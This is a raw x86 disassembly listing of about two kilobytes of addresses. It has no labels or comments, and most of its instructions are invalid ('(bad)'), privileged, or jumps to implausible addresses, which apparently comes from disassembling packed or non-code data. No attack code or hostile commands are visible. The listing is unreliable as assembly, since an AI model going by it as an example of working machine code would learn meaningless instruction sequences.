  41154c:	and    BYTE PTR [eax-0x1ab2e92d],ch
  411552:	es daa 
  411554:	nop
  411555:	mov    ds:0x34941f2f,eax
  41155a:	sbb    ebp,DWORD PTR [esi+ecx*1+0x493a03e9]
  411561:	pushf  
  411562:	clts   
  411564:	xchg   esp,eax
  411565:	and    BYTE PTR [esi],ah
  411567:	test   DWORD PTR ds:0xfa0e1bb8,edx
  41156d:	or     eax,0x493ef26
  411572:	sbb    esp,DWORD PTR [edx+0xf]
  411575:	jmp    0xe0d4f37d
  41157a:	sbb    esp,DWORD PTR [edx+0x0]
  41157d:	out    dx,al
  41157e:	and    eax,0x4dc9bb3
  411583:	cmp    eax,0x434e50fb
  411588:	enter  0x24e8,0x3d
  41158c:	adc    eax,0x93b19c0
  411591:	jmp    0xe3d5fc8e
  411596:	push   0x3e90931
  41159b:	xchg   esi,eax
  41159c:	xchg   ebx,eax
  41159d:	mov    ah,0x1c
  41159f:	adc    al,0xfa
  4115a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115a2:	and    eax,0x3b4145bb
  4115a7:	jo     0x4115ad
  4115a9:	jmp    0x2cec167c
  4115ae:	cmp    ah,cl
  4115b0:	(bad)  
  4115b1:	mov    eax,0x1166c47f
  4115b6:	cli    
  4115b7:	add    dh,BYTE PTR [edx+0x19]
  4115ba:	push   DWORD PTR [ebp-0x7a]
  4115bd:	add    eax,ebp
  4115bf:	cmp    BYTE PTR [edx],bh
  4115c1:	sbb    bh,dh
  4115c3:	ror    DWORD PTR [edx-0x5f],cl
  4115c6:	and    al,0xb1
  4115c8:	jae    0x4115e3
  4115ca:	std    
  4115cb:	fdivr  QWORD PTR [edx]
  4115cd:	and    esi,edi
  4115cf:	repnz push ebp
  4115d1:	pop    ss
  4115d2:	imul   esi,ecx,0xa847ceca
  4115d8:	xor    bl,BYTE PTR [eax]
  4115da:	je     0x4115bd
  4115dc:	cmp    ch,BYTE PTR [eax]
  4115de:	sbb    ch,BYTE PTR [esi]
  4115e0:	push   esp
  4115e1:	pop    ss
  4115e2:	je     0x4115d5
  4115e4:	sub    bl,BYTE PTR [ebx-0x4]
  4115e7:	push   ds
  4115e8:	push   esp
  4115e9:	pusha  
  4115ea:	add    cl,ch
  4115ec:	xor    cl,BYTE PTR [ecx]
  4115ee:	leave  
  4115ef:	sub    esi,DWORD PTR [ecx]
  4115f1:	or     DWORD PTR [ebp+0x72],edx
  4115f4:	dec    ecx
  4115f5:	mov    eax,ebx
  4115f7:	add    DWORD PTR ds:0xa5067c1,eax
  4115fd:	fdivr  st,st(7)
  4115ff:	lock or BYTE PTR [ecx],0xc3
  411603:	out    0xd,al
  411605:	popf   
  411606:	or     ebx,esi
  411608:	(bad)  
  411609:	adc    al,ch
  41160b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41160c:	das    
  41160d:	sbb    dh,bh
  41160f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411610:	add    bh,ch
  411612:	adc    al,0x0
  411614:	jmp    0x24ce1f4b
  411619:	dec    ebp
  41161a:	enter  0xa367,0xe1
  41161e:	leave  
  41161f:	inc    eax
  411621:	pmulhuw mm7,mm6
  411624:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411625:	mov    DWORD PTR [eax+0x73],ebx
  411628:	retf   
  411629:	bound  ecx,QWORD PTR [ebx-0x61dd6e84]
  41162f:	adc    eax,0xfeb94503
  411634:	add    BYTE PTR [ebp+0x20],ah
  411637:	out    0x38,al
  411639:	jg     0x411628
  41163b:	std    
  41163c:	or     ecx,DWORD PTR [eax+0x15c70568]
  411642:	loope  0x411642
  411644:	call   FWORD PTR [eax+0xc]
  411647:	call   0xfe2e550d
  41164c:	mov    eax,DWORD PTR [ebp+0x10c2c7f0]
  411652:	or     al,0x55
  411654:	mov    edi,DWORD PTR [ecx+edi*1+0x4e]
  411658:	pop    eax
  411659:	add    dh,ah
  41165b:	test   DWORD PTR [eax+0x8],0x5b0170e4
  411662:	in     eax,dx
  411663:	sub    ebx,ebx
  411665:	dec    edi
  411666:	addr16 push es
  411668:	call   0x3f0336
  41166d:	adc    ecx,esp
  41166f:	or     eax,0xc6684
  411674:	add    BYTE PTR [eax],al
  411676:	das    
  411677:	addr16 push es
  411679:	call   0x401c2a
  41167e:	ror    ebx,cl
  411680:	jae    0x411687
  411682:	xor    DWORD PTR [edx-0x15270002],edx
  411688:	jae    0x411696
  41168a:	fbstp  TBYTE PTR [ecx+0x6]
  41168d:	call   0x3f02fd
  411692:	jg     0x411705
  411694:	push   es
  411695:	call   0x4020a3
  41169a:	mov    ds:0x730273cb,eax
  41169f:	jge    0x41169e
  4116a1:	jne    0x411633
  4116a3:	jecxz  0x4116c6
  4116a5:	sbb    al,0xcf
  4116a7:	jmp    0x4116b2
  4116a9:	shl    BYTE PTR ds:0x3163eb0f,0x7f
  4116b0:	cwde   
  4116b1:	pop    es
  4116b2:	pop    ecx
  4116b3:	cli    
  4116b4:	(bad)  
  4116b5:	(bad)  
  4116b6:	data16 sbb al,BYTE PTR [edx+0x74]
  4116ba:	xor    edi,DWORD PTR [ebx-0x48]
  4116bd:	addr16 jmp esi
  4116c0:	(bad)  
  4116c1:	dec    DWORD PTR [edi+0x1c]
  4116c4:	or     ch,al
  4116c6:	jge    0x4116d6
  4116c8:	and    edi,esi
  4116ca:	sub    ah,dl
  4116cc:	cwde   
  4116cd:	add    DWORD PTR [edx+0x63],ecx
  4116d0:	and    DWORD PTR [ecx+edi*1-0x38],esi
  4116d4:	pop    ss
  4116d5:	sbb    ah,BYTE PTR [esi]
  4116d7:	ror    BYTE PTR [esi],1
  4116d9:	rol    BYTE PTR [eax],0xa4
  4116dc:	and    ch,BYTE PTR ds:0xa561633
  4116e2:	call   0xfe625b64
  4116e7:	cmp    ah,al
  4116e9:	cwde   
  4116ea:	add    DWORD PTR [edx],ecx
  4116ec:	dec    edi
  4116ed:	and    DWORD PTR [ecx+ebp*1+0x8],esi
  4116f1:	sbb    edx,DWORD PTR [esi+ebp*8]
  4116f4:	pop    es
  4116f5:	xchg   edi,esi
  4116f7:	adc    DWORD PTR [edi+0x1bf12b04],edx
  4116fd:	inc    edx
  4116fe:	jae    0x411742
  411700:	pop    ebp
  411701:	add    al,BYTE PTR [eax]
  411703:	and    DWORD PTR [eax],esp
  411705:	xchg   ebp,eax
  411706:	or     ecx,DWORD PTR [edx+0x31000221]
  41170c:	cmp    eax,DWORD PTR [edi]
  41170e:	mov    ebx,0x22032
  411713:	mov    edx,0x73c8bd63
  411718:	sbb    BYTE PTR [edx],al
  41171a:	push   ebp
  41171b:	stos   BYTE PTR es:[edi],al
  41171c:	inc    esp
  41171d:	mov    dl,0x57
  41171f:	or     DWORD PTR [ecx+0x58313f1c],ebx
  411725:	xchg   esp,eax
  411726:	add    BYTE PTR [edx+0x9],dh
  411729:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41172a:	and    al,BYTE PTR ds:0x2e989e05
  411730:	and    edx,ecx
  411732:	and    ch,BYTE PTR [edi+0x16]
  411735:	loope  0x41177a
  411737:	(bad)  
  411739:	test   DWORD PTR [eax+0xbf3162a],ebx
  41173f:	add    BYTE PTR [ecx-0x6],cl
  411742:	jne    0x411766
  411744:	dec    edi
  411745:	add    ch,BYTE PTR [ecx-0x24e9c468]
  41174b:	(bad)  
  41174d:	pushf  
  41174e:	lock sub esi,DWORD PTR [edx]
  411751:	push   ss
  411752:	push   ebp
  411753:	and    bh,cl
  411755:	dec    edx
  411756:	loopne 0x41175b
  411758:	jl     0x4116dc
  41175a:	push   esp
  41175b:	xchg   dl,dh
  41175d:	sub    al,0x99
  41175f:	mov    edx,0x1dc0b166
  411764:	or     cl,cl
  411766:	call   0x2a499786
  41176b:	and    cl,BYTE PTR [ebx+0x32]
  41176e:	adc    dh,bl
  411770:	jae    0x411788
  411772:	adc    eax,0xe825754a
  411777:	add    esi,DWORD PTR [ecx]
  411779:	or     DWORD PTR [eax+ecx*8-0x36],esi
  41177d:	mov    eax,0x16423210
  411782:	cmc    
  411783:	test   DWORD PTR [ebp+0x25],ecx
  411786:	call   0x2bc53623
  41178b:	xor    BYTE PTR [esi+0x21],ch
  41178e:	enter  0xb7f8,0x15
  411792:	imul   ebx,DWORD PTR [edi+0xb54089a],0xb4d4cbb4
  41179c:	xchg   esi,eax
  41179d:	aaa    
  41179e:	aam    0x20
  4117a0:	xchg   edi,eax
  4117a1:	mov    edi,edi
  4117a3:	xor    eax,DWORD PTR [eax]
  4117a5:	inc    ecx
  4117a6:	push   ss
  4117a7:	or     eax,0xfe15a365
  4117ac:	jmp    0x3a30e460
  4117b1:	push   eax
  4117b2:	popf   
  4117b3:	jmp    0x411736
  4117b5:	xchg   esi,eax
  4117b6:	push   ss
  4117b7:	dec    BYTE PTR [esi-0x3ffe254]
  4117bd:	mov    edi,0x72266156
  4117c2:	adc    eax,0xccf810e9
  4117c7:	jecxz  0x4117ac
  4117c9:	xor    cl,BYTE PTR [ecx]
  4117cb:	add    BYTE PTR [esi],ch
  4117cd:	jbe    0x4117fc
  4117cf:	(bad)  
  4117d0:	call   0xacce2107
  4117d5:	pop    edx
  4117d6:	(bad)  
  4117d7:	(bad)  
  4117d8:	aam    0x56
  4117da:	mov    ebx,0x13f4d5e7
  4117df:	(bad)  
  4117e0:	bnd jb 0x41177b
  4117e3:	punpckhdq mm5,QWORD PTR [esi+0x34b4ff2c]
  4117ea:	adc    al,0x74
  4117ec:	adc    DWORD PTR [ebp-0x1d],ecx
  4117ef:	cld    
  4117f0:	push   ds
  4117f1:	push   eax
  4117f2:	jg     0x4117cb
  4117f4:	push   ss
  4117f5:	(bad)  
  4117f6:	sub    al,0xe7
  4117f8:	jbe    0x4117e3
  4117fa:	adc    edi,esi
  4117fc:	repnz sbb eax,0xb66a149d
  411802:	sub    bh,bh
  411804:	jl     0x411827
  411806:	adc    al,0x4c
  411808:	add    eax,0x128c9500
  41180d:	jmp    0xf2193944
  411812:	xor    cl,BYTE PTR [ecx]
  411814:	jmp    0x4117b4
  411816:	pop    ebp
  411817:	or     DWORD PTR [edi+0x69],eax
  41181a:	xchg   ecx,eax
  41181b:	adc    al,0x73
  41181d:	add    BYTE PTR [edx+0x41],dh
  411820:	jle    0x411861
  411822:	mov    BYTE PTR [edx+eax*1+0xb],bh
  411826:	mov    ds:0xa30b9c7c,eax
  41182b:	jl     0x41183b
  41182d:	push   0x78
  41182f:	add    DWORD PTR [ebx-0x10],0x38
  411833:	gs enter 0x1973,0xd
  411838:	call   0xfe2a899a
  41183d:	call   FWORD PTR [ebp-0x1c]
  411840:	out    0x50,al
  411842:	jl     0x41182d
  411844:	std    
  411845:	mov    ebx,DWORD PTR [ebx-0x6436a6b7]
  41184b:	pop    ebx
  41184c:	mov    esp,ebp
  41184e:	leave  
  41184f:	retf   
  411850:	sahf   
  411851:	(bad)  
  411852:	xlat   BYTE PTR ds:[ebx]
  411853:	call   0x50296ead
  411858:	data16 in al,dx
  41185a:	or     DWORD PTR [eax-0x2],0xfffffff7
  41185e:	fiadd  DWORD PTR [esi]
  411860:	ret    
  411861:	call   DWORD PTR [edi+0x1841459f]
  411867:	mov    BYTE PTR ds:0xc98be700,bh
  41186d:	add    DWORD PTR [eax],eax
  41186f:	or     BYTE PTR [eax],cl
  411871:	lea    eax,[ebp-0x215e4]
  411877:	test   al,0x50
  411879:	out    0xa7,al
  41187b:	imul   eax
  41187d:	std    
  41187e:	or     ecx,DWORD PTR [eax]
  411880:	stc    
  411881:	and    DWORD PTR [ecx+ecx*8+0x5830007],0xfffffffc
  411889:	cld    
  41188a:	call   edi
  41188c:	push   es
  41188d:	je     0x4126d2
  411893:	inc    ebp
  411894:	and    BYTE PTR [esi+0x1e3b31fe],0x4f
  41189b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41189c:	jl     0x4118b5
  41189e:	std    
  41189f:	sahf   
  4118a0:	dec    edx
  4118a1:	sub    eax,DWORD PTR [ecx+0x3a]
  4118a4:	push   ebx
  4118a5:	push   ds
  4118a6:	sub    al,BYTE PTR [edi-0x785ca758]
  4118ac:	bound  ebx,QWORD PTR [esi]
  4118ae:	jmp    0x43ad:0xb60d3446
  4118b5:	push   0xfffffffd
  4118b7:	outs   dx,BYTE PTR ds:[esi]
  4118b8:	jp     0x41186d
  4118ba:	addr16 push edi
  4118bc:	out    dx,al
  4118bd:	(bad)  
  4118be:	jmp    FWORD PTR [ebp+0x56fd41a4]
  4118c4:	xchg   edx,eax
  4118c5:	mov    bl,0xe7
  4118c7:	(bad)  
  4118c8:	sub    DWORD PTR [edx],eax
  4118ca:	add    BYTE PTR [edx-0x4b72f093],dh
  4118d0:	fistp  WORD PTR ds:0x513600fe
  4118d6:	sbb    eax,0x1ebad5b4
  4118db:	(bad)  
  4118dc:	sbb    DWORD PTR [eax],ecx
  4118de:	in     al,0xfe
  4118e0:	push   ds
  4118e1:	call   0x451e:0xd417a388
  4118e8:	mov    dl,0xda
  4118ea:	repz jno 0x4118da
  4118ed:	jecxz  0x411947
  4118ef:	repz (bad) 
  4118f1:	jmp    0x411911
  4118f3:	out    0x4b,eax
  4118f5:	sbb    bl,BYTE PTR ds:0x5ba5f6fe
  4118fb:	std    
  4118fc:	out    0x3,al
  4118fe:	add    al,0x0
  411900:	xor    DWORD PTR [eax],esp
  411902:	test   al,0x1
  411904:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411905:	lods   eax,DWORD PTR ds:[esi]
  411906:	pop    ebx
  411907:	std    
  411908:	into   
  411909:	sbb    esi,DWORD PTR [edx+0x1c1c7cfe]
  41190f:	(bad)  
  411910:	mov    esi,0x228fd109
  411915:	adc    bl,ch
  411917:	or     dh,BYTE PTR [ecx+0x2]
  41191a:	ins    DWORD PTR es:[edi],dx
  41191b:	sbb    esp,DWORD PTR [esi-0x227b17ee]
  411921:	push   ecx
  411922:	(bad)  
  411923:	push   ds
  411924:	xchg   edi,eax
  411925:	les    esp,FWORD PTR [edx]
  411927:	add    al,0x31
  411929:	add    ch,BYTE PTR [ebx+ebp*1-0x7a]
  41192d:	adc    ch,al
  41192f:	nop
  411930:	mov    ch,0xe
  411932:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411933:	push   ds
  411934:	ja     0x4118ef
  411936:	adc    BYTE PTR [eax],cl
  411938:	add    BYTE PTR [eax],dh
  41193a:	or     ecx,ebp
  41193c:	sub    edi,DWORD PTR [eax]
  41193e:	or     ch,cl
  411940:	add    ebp,DWORD PTR [edx]
  411942:	dec    ecx
  411943:	cmc    
  411944:	xchg   DWORD PTR [edi+0x9],esp
  411947:	jmp    0xe84e254f
  41194c:	add    esi,DWORD PTR [ecx]
  41194e:	add    ah,BYTE PTR [esi+0x47]
  411951:	ds adc ch,al
  411954:	sub    esp,DWORD PTR [edx-0x7efc16f6]
  41195a:	mov    eax,ds:0x971924d
  41195f:	pop    esp
  411960:	mov    al,dh
  411962:	adc    al,BYTE PTR [ebp+0x1e]
  411965:	and    WORD PTR [edx],si
  411968:	push   es
  411969:	xor    DWORD PTR [ecx],ecx
  41196b:	push   0x47
  41196d:	cmp    bl,BYTE PTR [edi+0xdb590e8]
  411973:	es push ds
  411975:	idiv   DWORD PTR [eax+0x9343810]
  41197b:	jmp    0xe4ec710
  411980:	push   ds
  411981:	fistp  QWORD PTR [eax+0x120c2210]
  411987:	std    
  411988:	or     ecx,esi
  41198a:	fwait
  41198b:	dec    eax
  41198d:	call   0x8484:0x32a84763
  411994:	loop   0x4119ad
  411996:	adc    edi,esi
  411998:	cmp    DWORD PTR [ebp-0xb],ebx
  41199b:	push   ds
  41199c:	(bad)  
  41199d:	add    BYTE PTR [ebp+eax*4-0x6c],al
  4119a1:	stos   DWORD PTR es:[edi],eax
  4119a2:	aas    
  4119a3:	adc    edi,esi
  4119a5:	sbb    ebx,ebp
  4119a7:	sub    DWORD PTR [ebx-0x22],esp
  4119aa:	sub    eax,0xb7daea13
  4119af:	mov    ecx,es
  4119b1:	scas   eax,DWORD PTR es:[edi]
  4119b2:	sbb    al,0x13
  4119b4:	dec    edi
  4119b5:	je     0x411965
  4119b7:	push   cs
  4119b8:	std    
  4119b9:	sahf   
  4119ba:	dec    esp
  4119bb:	ret    0x92e7
  4119be:	addr16 adc bh,dh
  4119c1:	pusha  
  4119c2:	mov    dh,0x4d
  4119c4:	std    
  4119c5:	xchg   BYTE PTR [ebx+edx*1],dh
  4119c8:	mov    ah,0x3d
  4119ca:	das    
  4119cb:	adc    edi,esi
  4119cd:	jbe    0x4119ad
  4119cf:	adc    eax,0x2a1c6efd
  4119d4:	out    dx,eax
  4119d5:	call   DWORD PTR ds:0xc9290a13
  4119db:	(bad)  [edi+0x5a]
  4119de:	ror    cl,0xff
  4119e1:	inc    eax
  4119e2:	cs pop es
  4119e4:	add    cl,ch
  4119e6:	loop   0x411990
  4119e8:	repnz mov edx,0x7cfd10f3
  4119ee:	cdq    
  4119ef:	push   cs
  4119f0:	(bad)  
  4119f1:	cs dec ebp
  4119f3:	bound  esp,QWORD PTR [esi]
  4119f5:	es adc al,0xa2
  4119f8:	add    BYTE PTR [ebx+0x15ffa332],dl
  4119fe:	jle    0x411a54
  411a00:	std    
  411a01:	push   cs
  411a02:	add    BYTE PTR [eax+ebp*4],bh
  411a05:	int3   
  411a06:	add    BYTE PTR [eax-0x279601b5],ah
  411a0c:	in     al,0x6e
  411a0e:	pop    es
  411a0f:	fmul   DWORD PTR [edi+edi*8]
  411a12:	mov    ch,0xc
  411a14:	out    dx,eax
  411a15:	std    
  411a16:	jmp    eax
  411a18:	or     DWORD PTR [ebx],ebx
  411a1a:	dec    DWORD PTR [edi+0x7ea4b3ed]
  411a20:	in     eax,dx
  411a21:	std    
  411a22:	call   0x3e2ca7
  411a27:	outs   dx,DWORD PTR ds:[esi]
  411a28:	mov    bh,0xf2
  411a2a:	dec    bh
  411a2c:	in     eax,dx
  411a2d:	out    0x6c,al
  411a2f:	push   0xffffffed
  411a31:	std    
  411a32:	cld    
  411a33:	jnp    0x411a01
  411a35:	mov    bh,0xff
  411a37:	iret   
  411a38:	in     eax,dx
  411a39:	std    
  411a3a:	repnz (bad) 
  411a3c:	xor    eax,DWORD PTR ds:0xfc36d50f
  411a42:	jmp    FWORD PTR [edi-0x7436a2b2]
  411a48:	push   edi
  411a49:	mov    esp,ebp
  411a4b:	fcmovnb st,st(7)
  411a4d:	out    dx,al
  411a4e:	push   eax
  411a4f:	and    BYTE PTR [ebp-0x27],bl
  411a52:	std    
  411a53:	or     BYTE PTR ds:0xc94972f8,al
  411a59:	std    
  411a5a:	mov    ebp,DWORD PTR [edx-0x64]
  411a5d:	add    ax,0xc19
  411a61:	add    al,ch
  411a63:	aas    
  411a64:	adc    bh,ch
  411a66:	inc    DWORD PTR [eax]
  411a68:	js     0x4119eb
  411a6a:	rcl    BYTE PTR [eax-0x6f05b87f],1
  411a70:	xchg   ebx,eax
  411a71:	fimul  DWORD PTR [esi+0xb1568]
  411a77:	add    BYTE PTR [eax],ah
  411a79:	mov    dl,0x18
  411a7b:	dec    DWORD PTR [edi-0x64]
  411a7e:	mov    edx,edx
  411a80:	xor    DWORD PTR [ecx-0x763e103b],ebp
  411a86:	add    eax,0x2a223101
  411a8b:	test   al,0x2b
  411a8d:	bndldx bnd1,[edx-0x2e784e1d]
  411a94:	test   al,0x64
  411a96:	sbb    cl,BYTE PTR [edx-0x70ca651d]
  411a9c:	sbb    DWORD PTR [esi],esp
  411a9e:	add    eax,DWORD PTR [eax]
  411aa0:	xor    DWORD PTR [edi],esi
  411aa2:	nop
  411aa3:	sti    
  411aa4:	or     esp,DWORD PTR [edx]
  411aa6:	sub    dl,BYTE PTR [ebx+0x2f]
  411aa9:	and    al,BYTE PTR [edx]
  411aab:	nop
  411aac:	mov    edx,0x86d18e73
  411ab1:	int3   
  411ab2:	adc    esp,DWORD PTR [edi+0x35]
  411ab5:	and    DWORD PTR [edx],eax
  411ab7:	add    BYTE PTR [ecx+0x3100008d],cl
  411abd:	sbb    eax,DWORD PTR [edx+0x73]
  411ac0:	inc    ecx
  411ac1:	stos   DWORD PTR es:[edi],eax
  411ac2:	xor    eax,0x8e27c98f
  411ac7:	inc    eax
  411ac8:	xor    DWORD PTR [edi+0x5900ef90],eax
  411ace:	fild   DWORD PTR [eax]
  411ad0:	add    BYTE PTR [ecx],dh
  411ad2:	stos   DWORD PTR es:[edi],eax
  411ad3:	xor    eax,0x40c3169
  411ad8:	push   0x33
  411ada:	cmp    al,0x2
  411adc:	push   0x32
  411ade:	cmp    BYTE PTR [edx],al
  411ae0:	add    BYTE PTR [ecx],dh
  411ae2:	loopne 0x411afe
  411ae4:	je     0x411b07
  411ae6:	leave  
  411ae7:	adc    BYTE PTR [ebx],al
  411ae9:	xor    DWORD PTR [eax],esp
  411aeb:	mov    eax,DWORD PTR [ebp+eax*1+0x61]
  411aef:	or     eax,0x195c7cc0
  411af4:	je     0x411af3
  411af6:	fist   WORD PTR [eax+0x10a09ef]
  411afc:	add    DWORD PTR [ecx],esi
  411afe:	or     DWORD PTR [ebx+0x160958b7],edx
  411b04:	xchg   ecx,eax
  411b05:	into   
  411b06:	and    DWORD PTR [edx+0x2],edi
  411b09:	xor    DWORD PTR [ecx],ecx
  411b0b:	repnz inc ebx
  411b0d:	inc    edx
  411b0e:	std    
  411b0f:	test   al,0xab
  411b11:	sub    al,0x95
  411b13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b14:	add    esp,DWORD PTR [ecx+0x21]
  411b17:	in     al,dx
  411b18:	push   DWORD PTR [esi+0x1b04520e]
  411b1e:	or     DWORD PTR [ebx+0x6],edx
  411b21:	sbb    ecx,DWORD PTR [ecx]
  411b23:	inc    ebx
  411b24:	pop    es
  411b25:	or     DWORD PTR [ecx],ecx
  411b27:	jmp    0x3b4f8c2f
  411b2c:	adc    al,0x96
  411b2e:	pop    esi
  411b2f:	in     al,0x3
  411b31:	add    BYTE PTR [ecx],dh
  411b33:	sub    BYTE PTR [ebx],0x10
  411b36:	ds xchg ebp,eax
  411b38:	inc    ecx
  411b39:	lods   al,BYTE PTR ds:[esi]
  411b3a:	daa    
  411b3b:	xchg   ebp,eax
  411b3c:	daa    
  411b3d:	add    al,0x59
  411b3f:	push   esi
  411b40:	in     al,0x3
  411b42:	xor    DWORD PTR [ecx-0x381af500],edi
  411b48:	call   0x9055f867
  411b4d:	fsub   DWORD PTR ds:0x47b37d0e
  411b53:	xchg   esp,eax
  411b54:	jl     0x411b81
  411b56:	mov    ds:0xd903e905,al
  411b5b:	add    DWORD PTR [ecx],ebp
  411b5d:	nop
  411b5e:	xor    BYTE PTR [edx],ah
  411b60:	test   eax,0xc00d9d1a
  411b65:	mov    esi,0x1ae8c8a2
  411b6a:	popf   
  411b6b:	adc    DWORD PTR [eax+0x48],edx
  411b6e:	xor    eax,0xf286e909
  411b73:	cld    
  411b74:	inc    eax
  411b76:	rcr    DWORD PTR [ecx+0x404ae940],cl
  411b7c:	add    ebp,ecx
  411b7e:	xor    al,BYTE PTR [edx]
  411b80:	rcl    BYTE PTR [ebp-0x65085a34],0xf5
  411b87:	or     eax,0xa6d014e
  411b8c:	add    cl,ch
  411b8e:	aas    
  411b8f:	dec    ecx
  411b90:	jae    0x411b6c
  411b92:	xchg   esp,eax
  411b93:	or     eax,0x1b00e968
  411b98:	xchg   ebp,eax
  411b99:	imul   esi
  411b9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b9c:	sbb    eax,0xc87db467
  411ba1:	call   DWORD PTR [edx+0x2d]
  411ba4:	push   cs
  411ba5:	iret   
  411ba6:	(bad)  
  411ba7:	scas   al,BYTE PTR es:[edi]
  411ba8:	adc    edi,esp
  411baa:	push   ecx
  411bab:	call   0xe71d:0xbec6fe0e
  411bb2:	cmp    DWORD PTR [edx-0x514901f2],ecx
  411bb8:	adc    eax,0xe7a41e7
  411bbd:	(bad)  
  411bbe:	mov    al,0xf4
  411bc0:	mov    ah,0x8a
  411bc2:	lea    ebp,[ecx+ecx*2-0x4a5ac521]
  411bc9:	addr16 sbb al,0x38
  411bcc:	into   
  411bcd:	inc    DWORD PTR [eax+0x7ec308a7]
  411bd3:	lods   al,BYTE PTR ds:[esi]
  411bd4:	int3   
  411bd5:	pop    edi
  411bd6:	and    dh,BYTE PTR [edx+0xd]
  411bd9:	(bad)  
  411bda:	cmc    
  411bdb:	sub    ecx,DWORD PTR [edx-0x36023ac4]
  411be1:	(bad)  
  411be2:	call   0x296c219e
  411be7:	fadd   QWORD PTR [ecx-0x3e]
  411bea:	es (bad) 
  411bec:	adc    bh,bh
  411bee:	call   FWORD PTR [eax]
  411bf0:	or     DWORD PTR [eax],eax
  411bf2:	(bad)  
  411bf3:	int    0xf0
  411bf5:	(bad)  
  411bf6:	dec    DWORD PTR [eax]
  411bf8:	or     edi,eax
  411bfa:	inc    ebp
  411bfb:	add    BYTE PTR [eax*1-0x36280000],dh
  411c02:	inc    ebx
  411c03:	hlt    
  411c04:	fmul   DWORD PTR [eax]
  411c06:	add    BYTE PTR [eax],al
  411c08:	cmovl  ebp,esi
  411c0b:	add    al,cl
  411c0d:	or     BYTE PTR [eax],al
  411c0f:	lea    ebx,[ebp-0x7272b108]
  411c15:	cld    
  411c16:	dec    esi
  411c17:	lea    ecx,[ebp-0x3895b11c]
  411c1d:	add    DWORD PTR [ebx-0x4],0x68
  411c21:	pop    ebx
  411c22:	add    BYTE PTR [edx-0x65],ch
  411c25:	pop    esi
  411c26:	(bad)  
  411c27:	(bad)  
  411c28:	popf   
  411c29:	push   0x7f884149
  411c2e:	inc    ebx
  411c2f:	call   0x1278f4f
  411c34:	cmp    al,0x0
  411c36:	cmp    DWORD PTR [ebp+0x70],0x88fffede
  411c3d:	jnp    0x411cb1
  411c3f:	dec    DWORD PTR [ebp-0xf]
  411c42:	lea    eax,[ebp-0x70]
  411c45:	test   DWORD PTR [ebx-0x8],edi
  411c48:	dec    eax
  411c49:	jl     0x411ca3
  411c4b:	mov    eax,DWORD PTR ds:0xb73fe9ed
  411c51:	jne    0x411cb9
  411c53:	call   0x3e3bd1
  411c58:	ror    DWORD PTR [edx-0x22],1
  411c5b:	(bad)  
  411c5c:	jnp    0x411c3e
  411c5e:	adc    eax,0xf1970029
  411c63:	or     eax,eax
  411c65:	cld    
  411c66:	and    al,0x87
  411c68:	inc    ebp
  411c69:	xor    DWORD PTR [esi-0x14f6f454],edi
  411c6f:	cli    
  411c70:	dec    BYTE PTR [esi]
  411c72:	ret    
  411c73:	(bad)  
  411c74:	fbstp  TBYTE PTR [esi-0x7b00f59f]
  411c7a:	mov    esi,0xdb2d3f87
  411c7f:	int    0xc1
  411c81:	bound  esp,QWORD PTR [ecx+0x2]
  411c84:	(bad)  
  411c85:	xor    DWORD PTR [edi+0x22707244],edi
  411c8b:	add    edx,0x5d
  411c8e:	sti    
  411c8f:	(bad)
  411c92:	test   BYTE PTR [esi],ah
  411c94:	(bad)  
  411c95:	cmp    eax,0xbd7417c7
  411c9a:	adc    ch,ah
  411c9c:	pop    ebx
  411c9d:	push   0x61
  411c9f:	add    al,bh
  411ca1:	hlt    
  411ca2:	and    eax,0x22310003
  411ca7:	cmp    DWORD PTR [ecx+ecx*4+0x47],0x3
  411cac:	add    BYTE PTR [ecx],dh
  411cae:	mov    ch,0x0
  411cb0:	jmp    0xfe575fa2
  411cb5:	mov    dl,0xcc
  411cb7:	pop    ss
  411cb8:	inc    DWORD PTR [edx]
  411cba:	sub    DWORD PTR ds:0xf05a7574,edx
  411cc0:	pop    ebx
  411cc1:	cli    
  411cc2:	loopne 0x411cc7
  411cc4:	mov    eax,0x2223000
  411cc9:	add    dl,bh
  411ccb:	push   0x8daa5442
  411cd0:	add    bl,0x65
  411cd3:	out    dx,al
  411cd4:	scas   al,BYTE PTR es:[edi]
  411cd5:	dec    edi
  411cd6:	jmp    0xf240cad4
  411cdb:	and    DWORD PTR [edx],ebx
  411cdd:	jno    0x411d0f
  411cdf:	pop    edi
  411ce0:	push   ss
  411ce1:	sub    BYTE PTR [ecx+ecx*1+0x7d],0xcb
  411ce6:	jno    0x411cf1
  411ce8:	jmp    0x13c7467c
  411ced:	fs imul ecx,eax,0xffffffe8
  411cf1:	add    eax,DWORD PTR [ebx+eax*1-0x5198bbee]
  411cf8:	das    
  411cf9:	inc    ebx
  411cfa:	stos   DWORD PTR es:[edi],eax
  411cfb:	in     al,dx
  411cfc:	sub    dl,BYTE PTR [ebx+0x75400971]
  411d02:	xor    DWORD PTR [ecx],ecx
  411d04:	jmp    0x1e21e034
  411d09:	pop    ss
  411d0a:	mov    bl,0xcc
  411d0c:	cs xchg ebx,eax
  411d0e:	jno    0x411d19
  411d10:	jmp    0x794b44a4
  411d15:	inc    edi
  411d17:	aam    0x26
  411d19:	xchg   ebx,eax
  411d1a:	jno    0x411d25
  411d1c:	add    DWORD PTR [ebx+0xae90933],eax
  411d22:	jno    0x411cb8
  411d24:	jmp    0x411d52
  411d26:	sbb    BYTE PTR [eax],cl
  411d28:	jmp    0xc4b71d30
  411d2d:	aam    0x3
  411d2f:	xor    DWORD PTR [ecx],ecx
  411d31:	jmp    0x184e12be
  411d36:	stos   BYTE PTR es:[edi],al
  411d37:	xchg   BYTE PTR [eax+0x50316ea],ah
  411d3d:	inc    ebx
  411d3e:	add    al,0x76
  411d40:	xchg   esi,eax
  411d41:	in     al,0x16
  411d43:	inc    ebp
  411d44:	imul   esi,DWORD PTR [ecx],0xa8ff66c5
  411d4a:	(bad)  
  411d4b:	xor    eax,0x31035f20
  411d50:	or     DWORD PTR [esi+0x60213292],ecx
